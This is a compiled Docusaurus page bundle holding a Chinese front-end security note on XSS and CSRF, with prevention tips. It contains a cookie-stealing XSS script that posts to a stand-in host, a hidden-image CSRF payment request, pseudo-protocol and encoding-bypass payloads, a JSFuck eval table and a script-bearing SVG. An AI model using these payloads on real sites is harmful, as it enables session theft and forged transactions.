"use strict";(self.webpackChunkdocusaurus=self.webpackChunkdocusaurus||[]).push([[86225],{3905:(e,t,n)=>{n.d(t,{Zo:()=>p,kt:()=>d});var r=n(67294);function a(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function l(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);t&&(r=r.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,r)}return n}function i(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?l(Object(n),!0).forEach((function(t){a(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):l(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function o(e,t){if(null==e)return{};var n,r,a=function(e,t){if(null==e)return{};var n,r,a={},l=Object.keys(e);for(r=0;r<l.length;r++)n=l[r],t.indexOf(n)>=0||(a[n]=e[n]);return a}(e,t);if(Object.getOwnPropertySymbols){var l=Object.getOwnPropertySymbols(e);for(r=0;r<l.length;r++)n=l[r],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(a[n]=e[n])}return a}var s=r.createContext({}),u=function(e){var t=r.useContext(s),n=t;return e&&(n="function"==typeof e?e(t):i(i({},t),e)),n},p=function(e){var t=u(e.components);return r.createElement(s.Provider,{value:t},e.children)},c={inlineCode:"code",wrapper:function(e){var t=e.children;return r.createElement(r.Fragment,{},t)}},m=r.forwardRef((function(e,t){var n=e.components,a=e.mdxType,l=e.originalType,s=e.parentName,p=o(e,["components","mdxType","originalType","parentName"]),m=u(n),d=a,g=m["".concat(s,".").concat(d)]||m[d]||c[d]||l;return n?r.createElement(g,i(i({ref:t},p),{},{components:n})):r.createElement(g,i({ref:t},p))}));function d(e,t){var n=arguments,a=t&&t.mdxType;if("string"==typeof e||a){var l=n.length,i=new Array(l);i[0]=m;var o={};for(var s in t)hasOwnProperty.call(t,s)&&(o[s]=t[s]);o.originalType=e,o.mdxType="string"==typeof e?e:a,i[1]=o;for(var u=2;u<l;u++)i[u]=n[u];return r.createElement.apply(null,i)}return r.createElement.apply(null,n)}m.displayName="MDXCreateElement"},73518:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>s,contentTitle:()=>i,default:()=>c,frontMatter:()=>l,metadata:()=>o,toc:()=>u});var r=n(87462),a=(n(67294),n(3905));const l={title:"\u5e38\u89c1\u7684 web \u524d\u7aef\u653b\u51fb\u65b9\u5f0f\u6709\u54ea\u4e9b\uff1f !26487",ID:"26487",date:"2020-10-29 15:54:00",categories:["engineering","dev-prod-env"],tags:["engineering","dev-prod-env"],authors:["lzw"],slug:"/26487",type:"issues"},i="\u5e38\u89c1\u7684 web \u524d\u7aef\u653b\u51fb\u65b9\u5f0f\u6709\u54ea\u4e9b\uff1f",o={unversionedId:"engineering/26487",id:"engineering/26487",title:"\u5e38\u89c1\u7684 web \u524d\u7aef\u653b\u51fb\u65b9\u5f0f\u6709\u54ea\u4e9b\uff1f !26487",description:"\u5b89\u5168",source:"@site/issues/engineering/26487.md",sourceDirName:"engineering",slug:"/26487",permalink:"/docusaurus/issues/26487",draft:!1,tags:[{label:"engineering",permalink:"/docusaurus/issues/tags/engineering"},{label:"dev-prod-env",permalink:"/docusaurus/issues/tags/dev-prod-env"}],version:"current",frontMatter:{title:"\u5e38\u89c1\u7684 web \u524d\u7aef\u653b\u51fb\u65b9\u5f0f\u6709\u54ea\u4e9b\uff1f !26487",ID:"26487",date:"2020-10-29 15:54:00",categories:["engineering","dev-prod-env"],tags:["engineering","dev-prod-env"],authors:["lzw"],slug:"/26487",type:"issues"},sidebar:"tutorialSidebar",previous:{title:"\u624b\u5199\u8282\u6d41 throttle !26484",permalink:"/docusaurus/issues/26484"},next:{title:"\u524d\u7aef\u4e3a\u4f55\u8981\u6253\u5305\u548c\u6784\u5efa\uff1f !27209",permalink:"/docusaurus/issues/27209"}},s={},u=[],p={toc:u};function c(e){let{components:t,...n}=e;return(0,a.kt)("wrapper",(0,r.Z)({},p,n,{components:t,mdxType:"MDXLayout"}),(0,a.kt)("h1",{id:"\u5e38\u89c1\u7684-web-\u524d\u7aef\u653b\u51fb\u65b9\u5f0f\u6709\u54ea\u4e9b"},"\u5e38\u89c1\u7684 web \u524d\u7aef\u653b\u51fb\u65b9\u5f0f\u6709\u54ea\u4e9b\uff1f"),(0,a.kt)("p",null,"\u5b89\u5168"),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},"XSS \u8de8\u7ad9\u8bf7\u6c42\u653b\u51fb\uff08\u53cd\u5c04\u578b\uff0c\u5b58\u50a8\u578b\uff0cDOM\u578b\uff09"),(0,a.kt)("li",{parentName:"ul"},"XSRF \u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020")),(0,a.kt)("p",null,"XSS \u8de8\u7ad9\u8bf7\u6c42\u653b\u51fb"),(0,a.kt)("p",null,"\u6bd4\u5982\uff1a\u4e00\u4e2a\u535a\u5ba2\u7f51\u7ad9\uff0c\u6211\u53d1\u8868\u4e00\u7bc7\u535a\u5ba2\uff0c\u5176\u4e2d\u5d4c\u5165 ",(0,a.kt)("inlineCode",{parentName:"p"},"<script />"),"\u811a\u672c\uff0c\u83b7\u53d6 cookie\uff0c\u53d1\u9001\u5230\u6211\u7684\u8de8\u57df\u670d\u52a1\u5668\uff0c\u5f53\u6709\u4eba\u67e5\u770b\u8fd9\u7bc7\u6587\u7ae0\uff0c\u6211\u53ef\u4ee5\u83b7\u53d6\u8bbf\u95ee\u8005\u7684 cookie"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-js"},"<p>\u6a21\u62df XSS \u8de8\u7ad9\uff0c\u83b7\u53d6 cookie</p>\n<script> alert(document.cookie);$.post('test.com', {cookie: document.cookie}) <\/script>\n")),(0,a.kt)("p",null,"XSS \u9884\u9632\uff08\u4e5f\u53ef\u4ee5\u4f7f\u7528 XSS \u5de5\u5177\uff0c\u5982 ",(0,a.kt)("a",{parentName:"p",href:"https://www.npmjs.com/package/xss"},"https://www.npmjs.com/package/xss"),"\uff09"),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},"\u66ff\u6362\u7279\u6b8a\u5b57\u7b26\uff0c\u5982 < \u53d8\u6210",(0,a.kt)("inlineCode",{parentName:"li"},"&lt;")," > \u53d8\u6210",(0,a.kt)("inlineCode",{parentName:"li"},"`&gt;`")),(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("inlineCode",{parentName:"li"},"<script>")," \u53d8\u6210 ",(0,a.kt)("inlineCode",{parentName:"li"},"&lt;script&gt;")," ,\u8fd9\u6837\u4e0d\u4f1a\u4f5c\u4e3a\u811a\u672c\u6267\u884c"),(0,a.kt)("li",{parentName:"ul"},"\u5efa\u8bae\u524d\u540e\u7aef\u90fd\u66ff\u6362")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-js"},"&lt;script&gt; alert(document.cookie);$.post('test.com', {cookie: document.cookie}) &lt;/script&gt;\n")),(0,a.kt)("p",null,"CSRF/XSRF \u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020"),(0,a.kt)("p",null,"\u6bd4\u5982\uff1a\u4f60\u6b63\u5728\u8d2d\u7269\uff0c\u770b\u4e2d\u4e86\u67d0\u4e2a\u5546\u54c1\uff0c\u5546\u54c1 id \u662f 100\uff0c\u4ed8\u6b3e\u63a5\u53e3\uff1axxx.com/pay?id=100\uff0c\u4f46\u6ca1\u4efb\u4f55\u9a8c\u8bc1\uff0c\u653b\u51fb\u8005\u60f3\u8d2d\u4e70 id \u4e3a 200 \u7684\u5546\u54c1\uff0c\u901a\u8fc7\u53d1\u9001\u90ae\u4ef6\u9690\u85cf ",(0,a.kt)("inlineCode",{parentName:"p"},'<img src="xxx.com/pay?id=200" />'),"\uff0c\u4e00\u65e6\u67e5\u770b\u90ae\u4ef6\uff0c\u5c31\u8d2d\u4e70\u4e86 id \u4e3a 200 \u7684\u5546\u54c1"),(0,a.kt)("p",null,"XSRF \u9884\u9632\uff08\u73b0\u5728\u5f88\u5c11\u89c1\u4e86\uff09"),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},"\u4f7f\u7528 post \u63a5\u53e3"),(0,a.kt)("li",{parentName:"ul"},"\u589e\u52a0\u9a8c\u8bc1\uff0c\u4f8b\u5982\u5bc6\u7801\uff0c\u77ed\u4fe1\u9a8c\u8bc1\u7801\uff0c\u6307\u7eb9\u7b49")),(0,a.kt)("p",null,(0,a.kt)("strong",{parentName:"p"},"\u5176\u4ed6")),(0,a.kt)("p",null,"\u4e3a\u534f\u8bae\uff1a"),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},"Data \u4e3a\u534f\u8bae\uff1adata:text/html;base64,PHNjcsdd="),(0,a.kt)("li",{parentName:"ul"},"JavaScript\u4e3a\u534f\u8bae\uff1ajavascript:alert(1)")),(0,a.kt)("p",null,"Unicode \u7f16\u7801\u53ca URL \u7f16\u7801\u7ed5\u8fc7\uff1a"),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},"JavaScript \u7f16\u7801\uff1a&#x\uff0c","\\","u \u90fd\u53ef\u4ee5\u7528\u6765\u8868\u793a\u4e00\u4e32 Unicode \u7f16\u7801\uff0c\u5982\uff1a","\\","u0074 ","\\","u0065 ","\\","u0073 ","\\","u0074 \u6216 ","t"," ","e"," ","s"," ","t"),(0,a.kt)("li",{parentName:"ul"},"HTML\u5b9e\u4f53\u7f16\u7801\uff1a","t"," ","e"," ","s"," ","t"),(0,a.kt)("li",{parentName:"ul"},"URL\u7f16\u7801\uff1a%74 %65 %73 %74")),(0,a.kt)("p",null,"xss \u8815\u866b\uff0c\u6bd4\u5982\uff1a myspace\u8815\u866b\u653b\u51fb"),(0,a.kt)("p",null,"xss \u7f16\u7801\u6df7\u6dc6\uff0c\u5229\u7528\u6d4f\u89c8\u5668\u89e3\u6790\u7f16\u7801\u7684\u987a\u5e8f js <- url <- html\uff0c\u6bd4\u5982\uff1a jsFuck \u4f7f\u7528 6 \u4e2a\u5b57\u7b26 ","[","]","()!+ \u6765\u7f16\u5199"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-js"},'false       =>  ![]\ntrue        =>  !![]\nundefined   =>  [][[]]\nNaN         =>  +[![]]\n0           =>  +[]\n1           =>  +!+[]\n2           =>  !+[]+!+[]\n10          =>  +[[+!+[]]+[+[]]]\nArray       =>  []\nNumber      =>  +[]\nString      =>  []+[]\nBoolean     =>  ![]\nFunction    =>  []["filter"]\nrun         =>  []["filter"]["constructor"]( CODE )()\neval        =>  []["filter"]["constructor"]("return eval")()( CODE )\nwindow      =>  []["filter"]["constructor"]("return this")()\n')),(0,a.kt)("p",null,"SVG \u6587\u4ef6\u4e2d\u63d2\u5165 JS \u4ee3\u7801"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-js"},'<?xml version="1.0" standalone="no"?>\n<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">\n<svg width="100%" height="100%" version="1.1" xmlns="http://www.w3.org/2000/svg">\n    <script>\n        alert(11)\n    <\/script>\n</svg>\n')))}c.isMDXComponent=!0}}]);